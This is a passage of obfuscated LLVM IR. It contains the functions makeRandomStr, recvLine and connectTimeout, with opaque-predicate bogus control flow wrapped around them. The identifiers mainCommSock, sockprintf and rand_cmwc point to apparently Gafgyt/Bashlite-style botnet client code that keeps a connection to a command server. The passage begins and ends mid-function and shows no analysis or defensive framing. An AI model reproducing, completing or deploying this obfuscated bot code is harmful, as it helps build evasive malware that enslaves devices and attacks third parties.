  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 4096, i32 16, i1 false)
  %45 = load i32, i32* @x.35
  %46 = load i32, i32* @y.36
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %5

; <label>:53:                                     ; preds = %5
  %54 = load i32, i32* %2, align 4
  %55 = call i32 @close(i32 %54)
  %56 = load i32, i32* %1, align 4
  ret i32 %56

originalBBalteredBB:                              ; preds = %originalBB, %16
  %57 = load i32, i32* %1, align 4
  %_ = shl i32 %57, 1
  %_1 = sub i32 %57, 1
  %gen = mul i32 %_1, 1
  %_2 = shl i32 %57, 1
  %_3 = sub i32 0, %57
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 %57, 1
  %gen6 = mul i32 %_5, 1
  %_7 = shl i32 %57, 1
  %_8 = shl i32 %57, 1
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %1, align 4
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %35
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %59, i8 0, i64 4096, i32 16, i1 false)
  br label %originalBB9
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart224, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %54

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.37
  %12 = load i32, i32* @y.38
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.37
  %28 = load i32, i32* @y.38
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* @x.37
  %37 = load i32, i32* @y.38
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %35
  %44 = load i32, i32* %5, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.37
  %47 = load i32, i32* @y.38
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart224, label %originalBB15alteredBB

originalBBpart224:                                ; preds = %originalBB15
  br label %6

; <label>:54:                                     ; preds = %6
  %55 = load i32, i32* @x.37
  %56 = load i32, i32* @y.38
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %54
  %63 = load i32, i32* @x.37
  %64 = load i32, i32* @y.38
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %71 = call i32 @rand_cmwc()
  %_ = sub i32 0, %71
  %gen = add i32 %_, 26
  %_1 = sub i32 0, %71
  %gen2 = add i32 %_1, 26
  %_3 = shl i32 %71, 26
  %_4 = sub i32 0, %71
  %gen5 = add i32 %_4, 26
  %_6 = sub i32 %71, 26
  %gen7 = mul i32 %_6, 26
  %72 = urem i32 %71, 26
  %_8 = sub i32 0, %72
  %gen9 = add i32 %_8, 65
  %_10 = sub i32 0, %72
  %gen11 = add i32 %_10, 65
  %_12 = shl i32 %72, 65
  %_13 = sub i32 %72, 65
  %gen14 = mul i32 %_13, 65
  %73 = add i32 %72, 65
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %3, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  store i8 %74, i8* %78, align 1
  br label %originalBB

originalBB15alteredBB:                            ; preds = %originalBB15, %35
  %79 = load i32, i32* %5, align 4
  %_16 = sub i32 0, %79
  %gen17 = add i32 %_16, 1
  %_18 = sub i32 %79, 1
  %gen19 = mul i32 %_18, 1
  %_20 = shl i32 %79, 1
  %_21 = sub i32 0, %79
  %gen22 = add i32 %_21, 1
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %5, align 4
  br label %originalBB15

originalBB26alteredBB:                            ; preds = %originalBB26, %54
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.39
  %5 = load i32, i32* @y.40
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.__sigset_t, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.39
  %33 = load i32, i32* @y.40
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %41, i64 0, i64 0
  %43 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %42) #2, !srcloc !1
  %44 = extractvalue { i64, i64* } %43, 0
  %45 = extractvalue { i64, i64* } %43, 1
  %46 = trunc i64 %44 to i32
  store i32 %46, i32* %18, align 4
  %47 = ptrtoint i64* %45 to i64
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %19, align 4
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %13, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %55 = load i32, i32* %13, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %13, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %63, i32* %20, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %104

; <label>:65:                                     ; preds = %49
  br label %66

; <label>:66:                                     ; preds = %99, %65
  %67 = load i32, i32* %21, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %103

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = call i32 (i32, i8*, ...) @sockprintf(i32 %70, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0))
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %72, align 8
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %69
  %75 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 0
  %77 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %76) #2, !srcloc !2
  %78 = extractvalue { i64, i64* } %77, 0
  %79 = extractvalue { i64, i64* } %77, 1
  %80 = trunc i64 %78 to i32
  store i32 %80, i32* %22, align 4
  %81 = ptrtoint i64* %79 to i64
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %23, align 4
  br label %83

; <label>:83:                                     ; preds = %74
  %84 = load i32, i32* %13, align 4
  %85 = srem i32 %84, 64
  %86 = zext i32 %85 to i64
  %87 = shl i64 1, %86
  %88 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %89 = load i32, i32* %13, align 4
  %90 = sdiv i32 %89, 64
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %88, i64 0, i64 %91
  %93 = load i64, i64* %92, align 8
  %94 = or i64 %93, %87
  store i64 %94, i64* %92, align 8
  %95 = load i32, i32* %13, align 4
  %96 = add nsw i32 %95, 1
  %97 = call i32 @select(i32 %96, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %97, i32* %20, align 4
  %98 = icmp sle i32 %97, 0
  br i1 %98, label %99, label %102

; <label>:99:                                     ; preds = %83
  %100 = load i32, i32* %21, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %21, align 4
  br label %66

; <label>:102:                                    ; preds = %83
  br label %103

; <label>:103:                                    ; preds = %102, %66
  br label %104

; <label>:104:                                    ; preds = %103, %49
  store i32 0, i32* %26, align 4
  %105 = load i8*, i8** %14, align 8
  store i8* %105, i8** %25, align 8
  br label %106

; <label>:106:                                    ; preds = %172, %104
  %107 = load i32, i32* %15, align 4
  %108 = add nsw i32 %107, -1
  store i32 %108, i32* %15, align 4
  %109 = icmp sgt i32 %107, 1
  br i1 %109, label %110, label %175

; <label>:110:                                    ; preds = %106
  %111 = load i32, i32* @x.39
  %112 = load i32, i32* @y.40
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %110
  %119 = load i32, i32* @mainCommSock, align 4
  %120 = call i64 @recv(i32 %119, i8* %24, i64 1, i32 0)
  %121 = icmp ne i64 %120, 1
  %122 = load i32, i32* @x.39
  %123 = load i32, i32* @y.40
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %121, label %130, label %132

; <label>:130:                                    ; preds = %originalBBpart24
  %131 = load i8*, i8** %25, align 8
  store i8 0, i8* %131, align 1
  store i32 -1, i32* %12, align 4
  br label %194

; <label>:132:                                    ; preds = %originalBBpart24
  %133 = load i32, i32* @x.39
  %134 = load i32, i32* @y.40
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %132
  %141 = load i8, i8* %24, align 1
  %142 = load i8*, i8** %25, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %25, align 8
  store i8 %141, i8* %142, align 1
  %144 = load i8, i8* %24, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 10
  %147 = load i32, i32* @x.39
  %148 = load i32, i32* @y.40
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %146, label %155, label %172

; <label>:155:                                    ; preds = %originalBBpart28
  %156 = load i32, i32* @x.39
  %157 = load i32, i32* @y.40
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %155
  %164 = load i32, i32* @x.39
  %165 = load i32, i32* @y.40
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %175

; <label>:172:                                    ; preds = %originalBBpart28
  %173 = load i32, i32* %26, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %26, align 4
  br label %106

; <label>:175:                                    ; preds = %originalBBpart212, %106
  %176 = load i32, i32* @x.39
  %177 = load i32, i32* @y.40
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %175
  %184 = load i8*, i8** %25, align 8
  store i8 0, i8* %184, align 1
  %185 = load i32, i32* %26, align 4
  store i32 %185, i32* %12, align 4
  %186 = load i32, i32* @x.39
  %187 = load i32, i32* @y.40
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %194

; <label>:194:                                    ; preds = %originalBBpart216, %130
  %195 = load i32, i32* %12, align 4
  ret i32 %195

originalBBalteredBB:                              ; preds = %originalBB, %3
  %196 = alloca i32, align 4
  %197 = alloca i32, align 4
  %198 = alloca i8*, align 8
  %199 = alloca i32, align 4
  %200 = alloca %struct.__sigset_t, align 8
  %201 = alloca %struct.timeval, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  %205 = alloca i32, align 4
  %206 = alloca i32, align 4
  %207 = alloca i32, align 4
  %208 = alloca i8, align 1
  %209 = alloca i8*, align 8
  %210 = alloca i32, align 4
  store i32 %0, i32* %197, align 4
  store i8* %1, i8** %198, align 8
  store i32 %2, i32* %199, align 4
  %211 = load i8*, i8** %198, align 8
  %212 = load i32, i32* %199, align 4
  %213 = sext i32 %212 to i64
  call void @llvm.memset.p0i8.i64(i8* %211, i8 0, i64 %213, i32 1, i1 false)
  %214 = getelementptr inbounds %struct.timeval, %struct.timeval* %201, i32 0, i32 0
  store i64 30, i64* %214, align 8
  %215 = getelementptr inbounds %struct.timeval, %struct.timeval* %201, i32 0, i32 1
  store i64 0, i64* %215, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %110
  %216 = load i32, i32* @mainCommSock, align 4
  %217 = call i64 @recv(i32 %216, i8* %24, i64 1, i32 0)
  %218 = icmp ne i64 %217, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %132
  %219 = load i8, i8* %24, align 1
  %220 = load i8*, i8** %25, align 8
  %221 = getelementptr inbounds i8, i8* %220, i32 1
  store i8* %221, i8** %25, align 8
  store i8 %219, i8* %220, align 1
  %222 = load i8, i8* %24, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 10
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %155
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %175
  %225 = load i8*, i8** %25, align 8
  store i8 0, i8* %225, align 1
  %226 = load i32, i32* %26, align 4
  store i32 %226, i32* %12, align 4
  br label %originalBB14
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.41
  %6 = load i32, i32* @y.42
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca %struct.__sigset_t, align 8
  %20 = alloca %struct.timeval, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i64, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i8* %1, i8** %15, align 8
  store i32 %2, i32* %16, align 4
  store i32 %3, i32* %17, align 4
  %27 = load i32, i32* %14, align 4
  %28 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 3, i8* null)
  %29 = sext i32 %28 to i64
  store i64 %29, i64* %23, align 8
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, 2048
  store i64 %31, i64* %23, align 8
  %32 = load i32, i32* %14, align 4
  %33 = load i64, i64* %23, align 8
  %34 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 4, i64 %33)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %16, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i8*, i8** %15, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.41
  %45 = load i32, i32* @y.42
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %69

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.41
  %54 = load i32, i32* @y.42
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %52
  store i32 0, i32* %13, align 4
  %61 = load i32, i32* @x.41
  %62 = load i32, i32* @y.42
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %164

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %71 = getelementptr inbounds [8 x i8], [8 x i8]* %70, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 8, i32 4, i1 false)
  %72 = load i32, i32* %14, align 4
  %73 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %74 = call i32 @connect(i32 %72, %struct.sockaddr* %73, i32 16)
  store i32 %74, i32* %24, align 4
  %75 = load i32, i32* %24, align 4
  %76 = icmp slt i32 %75, 0
  br i1 %76, label %77, label %155

; <label>:77:                                     ; preds = %69
  %78 = call i32* @__errno_location() #13
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %81, label %153

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %17, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 %83, i64* %84, align 8
  %85 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 0, i64* %85, align 8
  br label %86

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %87, i64 0, i64 0
  %89 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %88) #2, !srcloc !3
  %90 = extractvalue { i64, i64* } %89, 0
  %91 = extractvalue { i64, i64* } %89, 1
  %92 = trunc i64 %90 to i32
  store i32 %92, i32* %25, align 4
  %93 = ptrtoint i64* %91 to i64
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %26, align 4
  br label %95

; <label>:95:                                     ; preds = %86
  %96 = load i32, i32* @x.41
  %97 = load i32, i32* @y.42
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  %104 = load i32, i32* %14, align 4
  %105 = srem i32 %104, 64
  %106 = zext i32 %105 to i64
  %107 = shl i64 1, %106
  %108 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %109 = load i32, i32* %14, align 4
  %110 = sdiv i32 %109, 64
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds [16 x i64], [16 x i64]* %108, i64 0, i64 %111
  %113 = load i64, i64* %112, align 8
  %114 = or i64 %113, %107
  store i64 %114, i64* %112, align 8
  %115 = load i32, i32* %14, align 4
  %116 = add nsw i32 %115, 1
  %117 = call i32 @select(i32 %116, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  %118 = icmp sgt i32 %117, 0
  %119 = load i32, i32* @x.41
  %120 = load i32, i32* @y.42
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart265, label %originalBB10alteredBB

originalBBpart265:                                ; preds = %originalBB10
  br i1 %118, label %127, label %151

; <label>:127:                                    ; preds = %originalBBpart265
  store i32 4, i32* %21, align 4
  %128 = load i32, i32* %14, align 4
  %129 = bitcast i32* %22 to i8*
  %130 = call i32 @getsockopt(i32 %128, i32 1, i32 4, i8* %129, i32* %21) #2
  %131 = load i32, i32* %22, align 4
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %133, label %150

; <label>:133:                                    ; preds = %127
  %134 = load i32, i32* @x.41
  %135 = load i32, i32* @y.42
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %133
  store i32 0, i32* %13, align 4
  %142 = load i32, i32* @x.41
  %143 = load i32, i32* @y.42
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %164

; <label>:150:                                    ; preds = %127
  br label %152

; <label>:151:                                    ; preds = %originalBBpart265
  store i32 0, i32* %13, align 4
  br label %164

; <label>:152:                                    ; preds = %150
  br label %154

; <label>:153:                                    ; preds = %77
  store i32 0, i32* %13, align 4
  br label %164

; <label>:154:                                    ; preds = %152
  br label %155

; <label>:155:                                    ; preds = %154, %69
  %156 = load i32, i32* %14, align 4
  %157 = call i32 (i32, i32, ...) @fcntl(i32 %156, i32 3, i8* null)
  %158 = sext i32 %157 to i64
  store i64 %158, i64* %23, align 8
  %159 = load i64, i64* %23, align 8
  %160 = and i64 %159, -2049
  store i64 %160, i64* %23, align 8
  %161 = load i32, i32* %14, align 4
  %162 = load i64, i64* %23, align 8
  %163 = call i32 (i32, i32, ...) @fcntl(i32 %161, i32 4, i64 %162)
  store i32 1, i32* %13, align 4
  br label %164

; <label>:164:                                    ; preds = %155, %153, %151, %originalBBpart269, %originalBBpart28
  %165 = load i32, i32* @x.41
  %166 = load i32, i32* @y.42
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %164
  %173 = load i32, i32* %13, align 4
  %174 = load i32, i32* @x.41
  %175 = load i32, i32* @y.42
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  ret i32 %173

originalBBalteredBB:                              ; preds = %originalBB, %4
  %182 = alloca i32, align 4
  %183 = alloca i32, align 4
  %184 = alloca i8*, align 8
  %185 = alloca i32, align 4
  %186 = alloca i32, align 4
  %187 = alloca %struct.sockaddr_in, align 4
  %188 = alloca %struct.__sigset_t, align 8
  %189 = alloca %struct.timeval, align 8
  %190 = alloca i32, align 4
  %191 = alloca i32, align 4
  %192 = alloca i64, align 8
  %193 = alloca i32, align 4
  %194 = alloca i32, align 4
  %195 = alloca i32, align 4
  store i32 %0, i32* %183, align 4
  store i8* %1, i8** %184, align 8
  store i32 %2, i32* %185, align 4
  store i32 %3, i32* %186, align 4
